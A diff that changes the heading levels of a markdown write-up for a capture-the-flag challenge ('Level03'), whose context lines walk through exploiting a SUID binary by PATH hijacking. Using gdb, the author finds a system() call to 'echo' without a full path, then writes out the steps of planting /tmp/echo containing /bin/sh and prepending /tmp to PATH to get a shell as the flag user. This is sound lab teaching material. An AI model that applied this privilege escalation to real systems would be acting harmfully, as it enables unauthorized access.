@@ -1,13 +1,13 @@
 # Level03
 
-### 1. Identity
+## 1. Identity
 
 	$ id
 	uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
 
 We are logged as **level03**.
 
-### 2. Home directory
+## 2. Home directory
 
 	$ pwd
 	/home/user/level03
@@ -24,7 +24,7 @@ It is a SUID binary owned by flag03. Executing it gives :
 	$ ./level03 
 	Exploit me
 
-### 3. First look at the binary
+## 3. First look at the binary
 
 Running **strings** or **nm** on the ELF gives us useful information:
 
@@ -44,7 +44,7 @@ To understand what happens, we load the binary into gdb.
 
 *(This challenge is similar to the first RootMe scripting challenge.)*
 
-### 4. Exploiting the ELF
+## 4. Exploiting the ELF
 
 **Doc :**
 
@@ -90,7 +90,7 @@ This gives the following disassembly:
 	0x08048504 <+96>:	ret    
 	End of assembler dump.
 
-### 5. Identifying the vulnerability
+## 5. Identifying the vulnerability
 
 The most interesting part is the call to system() :
 
@@ -104,7 +104,7 @@ This means the program calls :
 
 	system((char *)0x80485e0)
 
-### 6. Inspecting the system() argument
+## 6. Inspecting the system() argument
 
 In gdb :
 
@@ -122,25 +122,25 @@ If \<command\> contains a program name without a path, it will search through $P
 
 This allows a **PATH hijacking**.
 
-### 7. Exploitation
+## 7. Exploitation
 
-#### A. Create a malicious file
+### A. Create a malicious file
 ```
 $ echo '/bin/sh' > /tmp/echo
 $ chmod +x /tmp/echo
 ```
 
-#### B. Modify PATH:
+### B. Modify PATH:
 ```
 $ export PATH=/tmp:$PATH
 ```
 
-#### C. Run the binary:
+### C. Run the binary:
 ```
 $ ./level03
 ```
 
-### 8. Getting the flag
+## 8. Getting the flag
 
 Inside of our new shell :
 
